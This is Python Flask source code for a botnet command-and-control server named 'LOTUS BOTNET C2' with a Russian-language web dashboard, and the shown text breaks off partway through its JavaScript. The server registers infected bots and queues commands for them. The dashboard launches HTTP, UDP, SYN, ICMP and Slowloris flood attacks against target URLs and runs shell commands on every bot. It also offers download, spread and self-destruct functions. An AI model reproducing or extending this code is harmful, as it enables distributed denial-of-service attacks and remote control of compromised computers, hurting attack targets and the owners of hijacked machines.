import os
import sqlite3
import time
import json
import random
from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import threading

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect('database.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('''CREATE TABLE IF NOT EXISTS bots (
        id TEXT PRIMARY KEY,
        ip TEXT,
        info TEXT,
        status TEXT DEFAULT 'online',
        last_seen INTEGER,
        registered INTEGER,
        os TEXT,
        cpu TEXT,
        ram TEXT,
        country TEXT
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id TEXT,
        command TEXT,
        params TEXT,
        status TEXT DEFAULT 'pending',
        result TEXT,
        created INTEGER,
        executed INTEGER
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id TEXT,
        message TEXT,
        timestamp INTEGER
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS attack_status (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id TEXT,
        target TEXT,
        status_code TEXT,
        timestamp INTEGER
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

# ============== КЭШ ДЛЯ СТАТИСТИКИ ==============
stats_cache = {'data': None, 'time': 0}
cache_ttl = 3

def get_cached_stats():
    global stats_cache
    now = time.time()
    if stats_cache['data'] is None or (now - stats_cache['time']) > cache_ttl:
        conn = get_db()
        total = conn.execute('SELECT COUNT(*) FROM bots').fetchone()[0]
        online = conn.execute('SELECT COUNT(*) FROM bots WHERE status = "online" AND last_seen > ?',
                              (int(time.time()) - 600,)).fetchone()[0]
        offline = total - online
        commands = conn.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"').fetchone()[0]
        status_rows = conn.execute('SELECT status_code, COUNT(*) as count FROM attack_status GROUP BY status_code').fetchall()
        status_counts = {row['status_code']: row['count'] for row in status_rows}
        conn.close()
        stats_cache['data'] = {'total': total, 'online': online, 'offline': offline, 'commands': commands, 'status_counts': status_counts}
        stats_cache['time'] = now
    return stats_cache['data']

@app.route('/')
def home():
    return 'LOTUS BOTNET C2 - ONLINE'

@app.route('/api/register')
def register():
    bot_id = request.args.get('id')
    if not bot_id:
        return 'ERROR'
    ip = request.remote_addr
    now = int(time.time())
    conn = get_db()
    conn.execute('INSERT OR REPLACE INTO bots (id, ip, last_seen, registered, status) VALUES (?, ?, ?, ?, ?)',
                 (bot_id, ip, now, now, 'online'))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/get')
def get_command():
    bot_id = request.args.get('id')
    if not bot_id:
        return 'none'
    conn = get_db()
    conn.execute('UPDATE bots SET last_seen = ?, status = "online" WHERE id = ?',
                 (int(time.time()), bot_id))
    conn.commit()
    
    row = conn.execute('SELECT id, command, params FROM commands WHERE bot_id = ? AND status = "pending" LIMIT 1',
                       (bot_id,)).fetchone()
    if row:
        conn.execute('UPDATE commands SET status = "executing", executed = ? WHERE id = ?',
                     (int(time.time()), row['id']))
        conn.commit()
        conn.close()
        return f"{row['command']}:{row['params']}"
    conn.close()
    return 'none'

@app.route('/api/result', methods=['POST'])
def save_result():
    bot_id = request.args.get('id')
    result = request.form.get('result', '')
    if not bot_id:
        return 'ERROR'
    conn = get_db()
    row = conn.execute('SELECT id FROM commands WHERE bot_id = ? AND status = "executing" ORDER BY id DESC LIMIT 1',
                       (bot_id,)).fetchone()
    if row:
        conn.execute('UPDATE commands SET status = "done", result = ? WHERE id = ?',
                     (result, row['id']))
        conn.commit()
    conn.execute('INSERT INTO logs (bot_id, message, timestamp) VALUES (?, ?, ?)',
                 (bot_id, result, int(time.time())))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/attack_status', methods=['POST'])
def save_attack_status():
    try:
        data = request.get_json()
        if not data:
            return 'ERROR'
        bot_id = data.get('bot_id')
        target = data.get('target')
        status_code = data.get('status_code')
        if not bot_id or not target:
            return 'ERROR'
        conn = get_db()
        conn.execute('INSERT INTO attack_status (bot_id, target, status_code, timestamp) VALUES (?, ?, ?, ?)',
                     (bot_id, target, status_code, int(time.time())))
        conn.commit()
        conn.close()
        log_msg = f"🌐 {target} - {status_code}"
        conn = get_db()
        conn.execute('INSERT INTO logs (bot_id, message, timestamp) VALUES (?, ?, ?)',
                     (bot_id, log_msg, int(time.time())))
        conn.commit()
        conn.close()
        # Инвалидируем кэш
        global stats_cache
        stats_cache['data'] = None
        return 'OK'
    except:
        return 'ERROR'

@app.route('/api/attack_stats')
def get_attack_stats():
    target = request.args.get('target')
    limit = request.args.get('limit', 200, type=int)
    conn = get_db()
    if target:
        rows = conn.execute('SELECT * FROM attack_status WHERE target = ? ORDER BY timestamp DESC LIMIT ?', 
                           (target, limit)).fetchall()
    else:
        rows = conn.execute('SELECT * FROM attack_status ORDER BY timestamp DESC LIMIT ?', 
                           (limit,)).fetchall()
    conn.close()
    return jsonify([dict(row) for row in rows])

@app.route('/api/info', methods=['POST'])
def save_info():
    bot_id = request.args.get('id')
    info = request.get_data(as_text=True)
    if not bot_id:
        return 'ERROR'
    conn = get_db()
    conn.execute('UPDATE bots SET info = ? WHERE id = ?', (info, bot_id))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/stats')
def api_stats():
    return jsonify(get_cached_stats())

@app.route('/api/bots')
def api_bots():
    conn = get_db()
    rows = conn.execute('SELECT * FROM bots ORDER BY last_seen DESC').fetchall()
    conn.close()
    return jsonify([dict(row) for row in rows])

@app.route('/api/logs')
def api_logs():
    limit = request.args.get('limit', 200, type=int)
    conn = get_db()
    rows = conn.execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?', (limit,)).fetchall()
    conn.close()
    return jsonify([dict(row) for row in rows])

@app.route('/api/clear_logs', methods=['POST'])
def api_clear_logs():
    conn = get_db()
    conn.execute('DELETE FROM logs')
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/delete_bot', methods=['POST'])
def api_delete_bot():
    bot_id = request.form.get('id')
    if not bot_id:
        return 'ERROR'
    conn = get_db()
    conn.execute('DELETE FROM bots WHERE id = ?', (bot_id,))
    conn.commit()
    conn.close()
    global stats_cache
    stats_cache['data'] = None
    return 'OK'

@app.route('/api/send_command', methods=['POST'])
def api_send_command():
    bot_id = request.form.get('bot_id')
    command = request.form.get('command')
    params = request.form.get('params', '')
    if not command:
        return 'ERROR'
    conn = get_db()
    if bot_id == 'all':
        rows = conn.execute('SELECT id FROM bots WHERE status = "online"').fetchall()
        for row in rows:
            conn.execute('INSERT INTO commands (bot_id, command, params, created) VALUES (?, ?, ?, ?)',
                         (row['id'], command, params, int(time.time())))
    else:
        conn.execute('INSERT INTO commands (bot_id, command, params, created) VALUES (?, ?, ?, ?)',
                     (bot_id, command, params, int(time.time())))
    conn.commit()
    conn.close()
    global stats_cache
    stats_cache['data'] = None
    return 'OK'

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🐍 LOTUS BOTNET C2 v3.0</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🐍</text></svg>">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --bg-primary: #0a0e17;
            --bg-secondary: #111927;
            --bg-card: #141e2d;
            --bg-hover: #1a2a3d;
            --border-color: #1a2a3d;
            --text-primary: #e8edf5;
            --text-secondary: #8899bb;
            --text-muted: #556688;
            --accent: #2a7fff;
            --accent-glow: rgba(42, 127, 255, 0.2);
            --green: #2ecc71;
            --green-glow: rgba(46, 204, 113, 0.2);
            --red: #e74c3c;
            --red-glow: rgba(231, 76, 60, 0.2);
            --orange: #f39c12;
            --orange-glow: rgba(243, 156, 18, 0.2);
            --purple: #9b59b6;
            --radius: 12px;
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        body { 
            background: var(--bg-primary); 
            color: var(--text-primary); 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            padding: 20px; 
            min-height: 100vh;
        }
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: var(--bg-secondary); }
        ::-webkit-scrollbar-thumb { background: var(--accent); border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: #3a8fff; }
        
        .header { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            padding: 15px 20px;
            background: var(--bg-secondary);
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .header-left { display: flex; align-items: center; gap: 15px; }
        .header-left h1 { 
            font-size: 24px; 
            background: linear-gradient(135deg, var(--accent), var(--purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 800;
        }
        .header-left .version { 
            font-size: 11px; 
            color: var(--text-muted); 
            background: var(--bg-primary);
            padding: 2px 10px;
            border-radius: 20px;
            border: 1px solid var(--border-color);
        }
        .header-right { display: flex; align-items: center; gap: 15px; flex-wrap: wrap; }
        .header-right .time { color: var(--text-secondary); font-size: 13px; font-family: monospace; }
        .header-right .status-dot { 
            display: inline-block; 
            width: 10px; 
            height: 10px; 
            border-radius: 50%; 
            background: var(--green);
            box-shadow: 0 0 10px var(--green-glow);
            animation: pulse-dot 2s infinite;
        }
        @keyframes pulse-dot {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 12px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius);
            padding: 15px 18px;
            text-align: center;
            transition: var(--transition);
            cursor: pointer;
            position: relative;
            overflow: hidden;
        }
        .stat-card:hover { 
            border-color: var(--accent); 
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(0,0,0,0.3);
        }
        .stat-card .num { 
            font-size: 28px; 
            font-weight: 800; 
            font-family: 'Courier New', monospace;
            display: block;
        }
        .stat-card .num.green { color: var(--green); }
        .stat-card .num.red { color: var(--red); }
        .stat-card .num.blue { color: var(--accent); }
        .stat-card .num.orange { color: var(--orange); }
        .stat-card .num.purple { color: var(--purple); }
        .stat-card .label { 
            font-size: 11px; 
            color: var(--text-muted); 
            text-transform: uppercase; 
            letter-spacing: 0.5px;
            margin-top: 4px;
            display: block;
        }
        .stat-card .glow { 
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, var(--accent-glow) 0%, transparent 70%);
            opacity: 0;
            transition: var(--transition);
            pointer-events: none;
        }
        .stat-card:hover .glow { opacity: 0.3; }
        
        .tabs {
            display: flex;
            gap: 4px;
            margin-bottom: 20px;
            flex-wrap: wrap;
            background: var(--bg-secondary);
            padding: 4px;
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
        }
        .tab {
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 8px;
            transition: var(--transition);
            background: transparent;
            color: var(--text-secondary);
            border: none;
            font-size: 13px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .tab:hover { color: var(--text-primary); background: var(--bg-hover); }
        .tab.active { 
            background: var(--accent); 
            color: #fff;
            box-shadow: 0 4px 20px var(--accent-glow);
        }
        .tab .badge {
            background: var(--bg-primary);
            color: var(--text-secondary);
            font-size: 10px;
            padding: 1px 8px;
            border-radius: 20px;
            font-weight: 600;
        }
        .tab.active .badge { background: rgba(255,255,255,0.2); color: #fff; }
        
        .panel {
            display: none;
            background: var(--bg-secondary);
            padding: 20px;
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
            animation: fadeIn 0.3s ease;
        }
        .panel.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .panel-header h3 { color: var(--text-primary); font-size: 18px; }
        .panel-header .actions { display: flex; gap: 8px; flex-wrap: wrap; }
        
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th { 
            text-align: left; 
            padding: 10px 12px; 
            border-bottom: 2px solid var(--border-color); 
            color: var(--text-secondary);
            font-weight: 600;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        td { padding: 10px 12px; border-bottom: 1px solid var(--border-color); vertical-align: middle; }
        tr:hover td { background: var(--bg-hover); }
        
        .status-badge {
            display: inline-block;
            padding: 3px 12px;
            border-radius: 20px;
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.3px;
        }
        .status-badge.online { background: var(--green-glow); color: var(--green); }
        .status-badge.offline { background: var(--red-glow); color: var(--red); }
        .status-badge.pending { background: var(--orange-glow); color: var(--orange); }
        .status-badge.executing { background: var(--accent-glow); color: var(--accent); }
        .status-badge.done { background: var(--green-glow); color: var(--green); }
        
        .cmd-form {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin: 10px 0;
        }
        .cmd-form select, .cmd-form input {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            padding: 10px 15px;
            border-radius: 8px;
            font-size: 13px;
            flex: 1;
            min-width: 150px;
            transition: var(--transition);
            outline: none;
        }
        .cmd-form select:focus, .cmd-form input:focus { border-color: var(--accent); box-shadow: 0 0 20px var(--accent-glow); }
        .cmd-form select option { background: var(--bg-secondary); }
        .cmd-form button {
            background: var(--accent);
            color: #fff;
            border: none;
            padding: 10px 30px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: var(--transition);
            font-size: 13px;
        }
        .cmd-form button:hover { background: #3a8fff; transform: scale(1.02); box-shadow: 0 4px 20px var(--accent-glow); }
        .cmd-form button.danger { background: var(--red); }
        .cmd-form button.danger:hover { background: #c0392b; box-shadow: 0 4px 20px var(--red-glow); }
        .cmd-form button.success { background: var(--green); }
        .cmd-form button.success:hover { background: #27ae60; box-shadow: 0 4px 20px var(--green-glow); }
        
        .btn {
            background: var(--bg-primary);
            color: var(--text-secondary);
            border: 1px solid var(--border-color);
            padding: 6px 14px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 11px;
            transition: var(--transition);
            font-weight: 500;
        }
        .btn:hover { background: var(--bg-hover); color: var(--text-primary); border-color: var(--accent); }
        .btn.danger { border-color: var(--red); color: var(--red); }
        .btn.danger:hover { background: var(--red-glow); }
        .btn.success { border-color: var(--green); color: var(--green); }
        .btn.success:hover { background: var(--green-glow); }
        
        .logs-container {
            max-height: 500px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            background: var(--bg-primary);
            border-radius: 8px;
            padding: 10px;
        }
        .log-entry {
            padding: 4px 8px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            gap: 10px;
            align-items: baseline;
        }
        .log-entry .time { color: var(--text-muted); min-width: 70px; }
        .log-entry .bot { color: var(--accent); min-width: 100px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .log-entry .msg { word-break: break-all; }
        .log-entry .msg .status-2xx { color: var(--green); }
        .log-entry .msg .status-5xx { color: var(--red); }
        .log-entry .msg .status-4xx { color: var(--orange); }
        .log-entry .msg .status-3xx { color: #f1c40f; }
        
        .console {
            background: var(--bg-primary);
            border-radius: 8px;
            padding: 15px;
            border: 1px solid var(--border-color);
            font-family: 'Courier New', monospace;
        }
        .console-output {
            max-height: 450px;
            overflow-y: auto;
            font-size: 13px;
            line-height: 1.8;
        }
        .console-output .prompt { color: var(--accent); }
        .console-output .error { color: var(--red); }
        .console-output .info { color: var(--orange); }
        .console-output .success { color: var(--green); }
        .console-output .status-2xx { color: var(--green); }
        .console-output .status-5xx { color: var(--red); }
        .console-output .status-4xx { color: var(--orange); }
        .console-output .status-3xx { color: #f1c40f; }
        .console-input {
            display: flex;
            gap: 10px;
            margin-top: 12px;
        }
        .console-input input {
            flex: 1;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            padding: 10px 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            outline: none;
            transition: var(--transition);
        }
        .console-input input:focus { border-color: var(--accent); box-shadow: 0 0 20px var(--accent-glow); }
        .console-input button {
            background: var(--accent);
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: var(--transition);
        }
        .console-input button:hover { background: #3a8fff; }
        
        .status-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            margin-top: 10px;
        }
        .status-target {
            background: var(--bg-primary);
            border-radius: 8px;
            padding: 15px;
            border: 1px solid var(--border-color);
        }
        .status-target .target-name { color: var(--accent); font-weight: 600; font-size: 14px; }
        .status-target .codes { display: flex; gap: 12px; flex-wrap: wrap; margin: 8px 0; }
        .status-target .codes span { font-weight: 700; font-size: 14px; }
        .status-target .recent { font-size: 11px; color: var(--text-muted); }
        
        .ddos-panel {
            background: var(--bg-primary);
            padding: 20px;
            border-radius: 8px;
            border: 1px solid var(--border-color);
            margin-top: 10px;
        }
        
        @media (max-width: 768px) {
            body { padding: 10px; }
            .header { flex-direction: column; align-items: flex-start; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
            .tabs { overflow-x: auto; flex-wrap: nowrap; }
            .tab { font-size: 12px; padding: 8px 14px; white-space: nowrap; }
            .cmd-form { flex-direction: column; }
            .status-container { grid-template-columns: 1fr; }
        }
        
        .id-cell { font-family: monospace; font-size: 11px; max-width: 120px; overflow: hidden; text-overflow: ellipsis; }
        .text-muted { color: var(--text-muted); }
        .text-success { color: var(--green); }
        .text-danger { color: var(--red); }
        .text-warning { color: var(--orange); }
        .text-info { color: var(--accent); }
        .gap-2 { gap: 8px; }
        .flex { display: flex; align-items: center; }
        .flex-wrap { flex-wrap: wrap; }
        .mt-2 { margin-top: 10px; }
        .mb-2 { margin-bottom: 10px; }
        .w-full { width: 100%; }
        
        .glow-text {
            text-shadow: 0 0 40px var(--accent-glow);
        }
    </style>
</head>
<body>

<div class="header">
    <div class="header-left">
        <h1>🐍 LOTUS BOTNET</h1>
        <span class="version">v3.0</span>
        <span class="status-dot"></span>
    </div>
    <div class="header-right">
        <span class="time" id="headerTime">--:--:--</span>
        <span class="text-muted" style="font-size:12px;">|</span>
        <span style="font-size:12px; color: var(--text-secondary);">Ботов: <span id="headerBots" class="text-info">0</span></span>
    </div>
</div>

<div class="stats-grid" id="statsGrid">
    <div class="stat-card">
        <div class="glow"></div>
        <span class="num blue" id="statTotal">0</span>
        <span class="label">👾 Всего ботов</span>
    </div>
    <div class="stat-card">
        <div class="glow" style="background: radial-gradient(circle, var(--green-glow) 0%, transparent 70%);"></div>
        <span class="num green" id="statOnline">0</span>
        <span class="label">🟢 Онлайн</span>
    </div>
    <div class="stat-card">
        <div class="glow" style="background: radial-gradient(circle, var(--red-glow) 0%, transparent 70%);"></div>
        <span class="num red" id="statOffline">0</span>
        <span class="label">🔴 Оффлайн</span>
    </div>
    <div class="stat-card">
        <div class="glow" style="background: radial-gradient(circle, var(--orange-glow) 0%, transparent 70%);"></div>
        <span class="num orange" id="statCommands">0</span>
        <span class="label">📨 Команд в очереди</span>
    </div>
    <div class="stat-card">
        <div class="glow" style="background: radial-gradient(circle, var(--green-glow) 0%, transparent 70%);"></div>
        <span class="num green" id="stat200">0</span>
        <span class="label">✅ 200 OK</span>
    </div>
    <div class="stat-card">
        <div class="glow" style="background: radial-gradient(circle, var(--red-glow) 0%, transparent 70%);"></div>
        <span class="num red" id="stat503">0</span>
        <span class="label">❌ 503 Error</span>
    </div>
</div>

<div class="tabs">
    <button class="tab active" onclick="showPanel('bots')">🤖 Боты <span class="badge" id="tabBotsCount">0</span></button>
    <button class="tab" onclick="showPanel('commands')">📡 Команды <span class="badge" id="tabCommandsCount">0</span></button>
    <button class="tab" onclick="showPanel('logs')">📋 Логи</button>
    <button class="tab" onclick="showPanel('status')">📊 Статусы</button>
    <button class="tab" onclick="showPanel('ddos')">💥 DDoS</button>
    <button class="tab" onclick="showPanel('console')">⌨️ Консоль</button>
</div>

<!-- БОТЫ -->
<div class="panel active" id="panel-bots">
    <div class="panel-header">
        <h3>🤖 Управление ботами</h3>
        <div class="actions">
            <button class="btn" onclick="refreshBots()">🔄 Обновить</button>
            <button class="btn danger" onclick="deleteAllBots()">🗑️ Удалить всех</button>
        </div>
    </div>
    <div style="overflow-x:auto;">
        <table>
            <thead><tr><th>ID</th><th>IP</th><th>Статус</th><th>Последний раз</th><th>Действия</th></tr></thead>
            <tbody id="botsBody"></tbody>
        </table>
    </div>
</div>

<!-- КОМАНДЫ -->
<div class="panel" id="panel-commands">
    <div class="panel-header">
        <h3>📡 Отправить команду</h3>
    </div>
    <form class="cmd-form" onsubmit="sendCommand(event)">
        <select id="cmdBotSelect"><option value="all">🌐 ВСЕМ БОТАМ</option></select>
        <select id="cmdType">
            <option value="http_flood">💥 HTTP Flood</option>
            <option value="udp_flood">💥 UDP Flood</option>
            <option value="syn_flood">💥 SYN Flood</option>
            <option value="slowloris">🐌 Slowloris</option>
            <option value="icmp_flood">💥 ICMP Flood</option>
            <option value="mix_flood">⚡ MIX Flood</option>
            <option value="cmd">💻 CMD</option>
            <option value="download">📥 Скачать</option>
            <option value="update">🔄 Обновить</option>
            <option value="selfdestruct">💀 Самоуничтожение</option>
            <option value="spread">📀 Распространить</option>
            <option value="info">📊 Информация</option>
            <option value="ping">🏓 Ping</option>
            <option value="stop_attack">⏹ Остановить атаку</option>
            <option value="stats">📊 Статистика бота</option>
        </select>
        <input type="text" id="cmdParams" placeholder="Параметры (URL, команда, цель)">
        <button type="submit">▶ Отправить</button>
    </form>
    <div class="panel-header" style="margin-top:20px;">
        <h3>📋 История команд</h3>
        <button class="btn" onclick="refreshCommands()">🔄 Обновить</button>
    </div>
    <div style="overflow-x:auto;"><table><thead><tr><th>Бот</th><th>Команда</th><th>Статус</th><th>Результат</th></tr></thead><tbody id="commandsBody"></tbody></table></div>
</div>

<!-- ЛОГИ -->
<div class="panel" id="panel-logs">
    <div class="panel-header">
        <h3>📋 Системные логи</h3>
        <div class="actions">
            <button class="btn" onclick="refreshLogs()">🔄 Обновить</button>
            <button class="btn danger" onclick="clearLogs()">🗑️ Очистить</button>
        </div>
    </div>
    <div class="logs-container" id="logsContainer"></div>
</div>

<!-- СТАТУСЫ -->
<div class="panel" id="panel-status">
    <div class="panel-header">
        <h3>📊 Статусы HTTP атак</h3>
        <div class="flex gap-2">
            <span class="text-success">🟢 2xx</span>
            <span class="text-warning">🟡 3xx</span>
            <span class="text-danger">🔴 5xx</span>
            <span class="text-warning">🟠 4xx</span>
        </div>
    </div>
    <div class="status-container" id="statusContainer">
        <div class="text-muted">Загрузка данных...</div>
    </div>
</div>

<!-- DDoS -->
<div class="panel" id="panel-ddos">
    <div class="panel-header">
        <h3>💥 Массовая DDoS атака</h3>
    </div>
    <div class="ddos-panel">
        <form class="cmd-form" onsubmit="startDDoS(event)">
            <input type="text" id="ddosTarget" placeholder="https://target.com" style="flex:2; min-width:300px;">
            <select id="ddosType" style="flex:0.5;">
                <option value="http_flood">HTTP Flood</option>
                <option value="udp_flood">UDP Flood</option>
                <option value="syn_flood">SYN Flood</option>
                <option value="slowloris">Slowloris</option>
                <option value="icmp_flood">ICMP Flood</option>
                <option value="mix_flood">⚡ MIX (ВСЁ)</option>
            </select>
            <button type="submit" class="danger" style="background:var(--red);">🔥 ЗАПУСТИТЬ</button>
        </form>
        <div style="margin-top:15px; display:flex; gap:20px; flex-wrap:wrap;">
            <span>📊 Ботов в атаке: <strong class="text-info" id="ddosCount">0</strong></span>
            <span>📈 Всего запросов: <strong class="text-success" id="ddosRequests">0</strong></span>
            <button class="btn danger" onclick="stopAttack()">⏹ ОСТАНОВИТЬ ВСЕ АТАКИ</button>
        </div>
    </div>
</div>

<!-- КОНСОЛЬ -->
<div class="panel" id="panel-console">
    <div class="panel-header">
        <h3>⌨️ Командная консоль</h3>
        <div class="actions">
            <button class="btn" onclick="clearConsole()">🗑️ Очистить</button>
            <button class="btn" onclick="exportConsole()">💾 Экспорт</button>
        </div>
    </div>
    <div class="console">
        <div class="console-output" id="consoleOutput">
            <div class="info">╔═══════════════════════════════════════════════════╗</div>
            <div class="info">║  🐍 LOTUS BOTNET C2 v3.0 - КОНСОЛЬ УПРАВЛЕНИЯ     ║</div>
            <div class="info">╚═══════════════════════════════════════════════════╝</div>
            <div class="info">💡 Введите help для списка команд</div>
            <div class="info">📊 Статусы HTTP отображаются в реальном времени</div>
            <div style="margin-top:8px; border-top:1px solid var(--border-color); padding-top:8px;"></div>
        </div>
        <div class="console-input">
            <input type="text" id="consoleInput" placeholder="Введите команду..." autofocus>
            <button onclick="executeConsoleCommand()">⏎ Выполнить</button>
        </div>
    </div>
    <details style="margin-top:15px; color:var(--text-muted); font-size:12px;">
        <summary style="cursor:pointer; color:var(--accent); font-weight:600;">📖 Список команд</summary>
        <div style="margin-top:10px; display:grid; grid-template-columns: auto 1fr auto; gap:4px 20px; font-size:12px;">
            <span class="text-info">help</span><span>Показать это меню</span><span></span>
            <span class="text-info">list</span><span>Список всех ботов</span><span></span>
            <span class="text-info">cmd &lt;команда&gt;</span><span>Выполнить CMD на всех ботах</span><span class="text-muted">cmd whoami</span>
            <span class="text-info">cmd &lt;бот_id&gt; &lt;команда&gt;</span><span>CMD на конкретном боте</span><span class="text-muted">cmd BOT_123 whoami</span>
            <span class="text-info">ddos &lt;url&gt;</span><span>HTTP Flood</span><span class="text-muted">ddos https://target.com</span>
            <span class="text-info">udp &lt;url&gt;</span><span>UDP Flood</span><span></span>
            <span class="text-info">mix &lt;url&gt;</span><span>ВСЕ ТИПЫ ОДНОВРЕМЕННО</span><span></span>
            <span class="text-info">info &lt;бот_id&gt;</span><span>Информация о боте</span><span></span>
            <span class="text-info">kill &lt;бот_id&gt;</span><span>Самоуничтожение</span><span></span>
            <span class="text-info">spread</span><span>Распространение</span><span></span>
            <span class="text-info">stop</span><span>Остановить все атаки</span><span></span>
            <span class="text-info">ping</span><span>Проверить соединение</span><span></span>
            <span class="text-info">stats</span><span>Статистика</span><span></span>
            <span class="text-info">logs</span><span>Показать логи</span><span></span>
            <span class="text-info">clear</span><span>Очистить логи</span><span></span>
            <span class="text-info">clearconsole</span><span>Очистить консоль</span><span></span>
        </div>
    </details>
</div>

<script>
// ===================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =====================
let statusInterval = null;
let totalRequests = 0;

// ===================== ПОКАЗ ПАНЕЛИ =====================
function showPanel(name) {
    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.getElementById('panel-' + name).classList.add('active');
    document.querySelector(`.tab[onclick*="${name}"]`)?.classList.add('active');
    if (name === 'bots') refreshBots();
    if (name === 'logs') refreshLogs();
    if (name === 'status') refreshAttackStatus();
    if (name === 'commands') refreshCommands();
    if (name === 'console') document.getElementById('consoleInput').focus();
}

// ===================== СТАТИСТИКА =====================
async function refreshStats() {
    try {
        const r = await fetch('/api/stats');
        const data = await r.json();
        document.getElementById('statTotal').textContent = data.total || 0;
        document.getElementById('statOnline').textContent = data.online || 0;
        document.getElementById('statOffline').textContent = data.offline || 0;
        document.getElementById('statCommands').textContent = data.commands || 0;
        document.getElementById('tabBotsCount').textContent = data.total || 0;
        document.getElementById('tabCommandsCount').textContent = data.commands || 0;
        document.getElementById('ddosCount').textContent = data.online || 0;
        document.getElementById('headerBots').textContent = data.total || 0;
        if (data.status_counts) {
            document.getElementById('stat200').textContent = data.status_counts['200 OK'] || 0;
            document.getElementById('stat503').textContent = data.status_counts['503 Service Unavailable'] || 0;
        }
    } catch {}
}

// ===================== БОТЫ =====================
async function refreshBots() {
    try {
        const r = await fetch('/api/bots');
        const data = await r.json();
        const tbody = document.getElementById('botsBody');
        const select = document.getElementById('cmdBotSelect');
        select.innerHTML = '<option value="all">🌐 ВСЕМ БОТАМ</option>';
        tbody.innerHTML = '';
        if (data.length === 0) {
            tbody.innerHTML = '<tr><td colspan="5" class="text-muted" style="text-align:center;padding:30px;">Нет подключенных ботов</td></tr>';
        }
        data.forEach(bot => {
            const statusClass = bot.status === 'online' ? 'online' : 'offline';
            const lastSeen = bot.last_seen ? new Date(bot.last_seen * 1000).toLocaleString() : 'Никогда';
            const ip = bot.ip || 'N/A';
            const tr = document.createElement('tr');
            tr.innerHTML = `<td class="id-cell">${bot.id}</td><td>${ip}</td><td><span class="status-badge ${statusClass}">${bot.status}</span></td><td>${lastSeen}</td><td>
                <button class="btn" onclick="quickCmd('${bot.id}','info','')" title="Информация">📊</button>
                <button class="btn" onclick="quickCmd('${bot.id}','ping','')" title="Ping">🏓</button>
                <button class="btn danger" onclick="deleteBot('${bot.id}')" title="Удалить">🗑️</button>
            </td>`;
            tbody.appendChild(tr);
            const opt = document.createElement('option');
            opt.value = bot.id;
            opt.textContent = bot.id + ' (' + ip + ')';
            select.appendChild(opt);
        });
        refreshStats();
    } catch {}
}

async function deleteBot(id) {
    if (!confirm('Удалить бота ' + id + '?')) return;
    const fd = new FormData(); fd.append('id', id);
    await fetch('/api/delete_bot', { method: 'POST', body: fd });
